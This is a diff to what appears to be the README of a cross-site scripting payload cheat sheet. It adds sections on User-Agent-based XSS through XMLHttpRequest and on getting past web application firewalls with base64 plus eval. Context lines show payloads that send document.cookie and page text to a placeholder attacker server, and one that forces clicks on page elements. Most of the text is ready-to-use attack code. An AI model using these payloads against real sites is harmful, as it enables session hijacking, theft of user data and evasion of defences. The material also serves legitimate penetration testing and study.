@@ -19,6 +19,10 @@ Originally this started as just a little list of PoC payloads but it has now exp
   + [ONKEY/UP/DOWN/PRESS](#onkeyupdownpress)
 + **ANGULAR NOTE**
   + [PAYLOADS FOR ANGULAR](#angular)
++ **USER-AGENT BASED XSS**
+  + [XMLHTTPREQUEST()](#-user-agent-based-xss)
++ **BYPASSING WAFS**
+  + [BASE64 ENCODING](#-bypassing-wafs)
 
 # 👁️‍🗨️ EXFILTRATION
 *For session hijacking, sensitive info exfil, etc.*
@@ -69,12 +73,14 @@ $.get("https://$ATTACKER_SERVER/?exfil="+document.cookie)
 $.get("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
 ```
 
+
 # 💥 FORCING ACTIONS
 *For forcing users to preform a certain action. This is tricky because every app is going to be different and thus these will require **modification**.*
 ### CLICK ELEMENT BY ID
 ```javascript
 document.getElementById("$TARGET_ELEMENT_ID").click()
 ```
+
 
 # 🏠 SETTING ITEMS
 *Sometimes you may want to set items in the browsers storage for vulnerability chains or persistence.*
@@ -89,6 +95,7 @@ document.cookie="cookieName=cookieValue>;Path=/"
 ```javascript
 window.localStorage.setItem('itemName', 'itemValue');
 ```
+
 
 # 📔 EVENT ATTRIBUTES
 *Something super crucial about event attributes is that **not every HTML tag is going to support the same event attributes**. So when you have injection into a div and you're trying to use `onload()` it's not going to work.*
@@ -127,6 +134,31 @@ ALL ELEMENTS EXCEPT:
 ALL ELEMENTS EXCEPT:
 <base>, <bdo>, <br>, <head>, <html>, <iframe>, <meta>, <param>, <script>, <style>, and <title>
 ```
+
+
+# 🪦 USER-AGENT BASED XSS
+**NOTE:** Most browsers (Chrome [*et al*] and FireFox) have read-only user-agent headers so while they can be *read* they cannot be modified without having something on-top of the Browser (i.e a Chrome extension or proxy). However, at the time of writing this **Safari on desktop and IOS** does not protect the user-agent header. Because of this, you can do some magic with XMLHttpRequest().
+
+**PAYLOAD NOTE:** The below JavaScript assumes that the User-Agent is being returned in the response within a HTML attribute (i.e `agent="AAAAA"`) and uses `">` to end the element. document.write() is then used to return the body of the request.
+```JavaScript
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "YOUR_URL", true);
+xhr.setRequestHeader('User-Agent','AAAAAAAA"><script>alert(1)</script>');
+xhr.onreadystatechange = function() {
+    document.write(xhr.response)
+}
+```
+
+
+# 🥷 BYPASSING WAFS
+**NOTE:** If you're running into a WAF that is looking for characters like `<`,`>`, or `/` but you can create simple payloads (*for example an event attribute `onmouseover=alert(1)`*) you may be able to circumvent the WAF by using Base64 encoding.
+```JavaScript
+// Encode your payload
+btoa('YourPayload()');
+// Decode your payload and pass to eval()
+eval(atob('YWxlcnQoMSk='));
+```
+
 
 # ANGULAR
 For Angular template injection you should be able to use the above payloads in conjunction with constructors. You can find an example below.
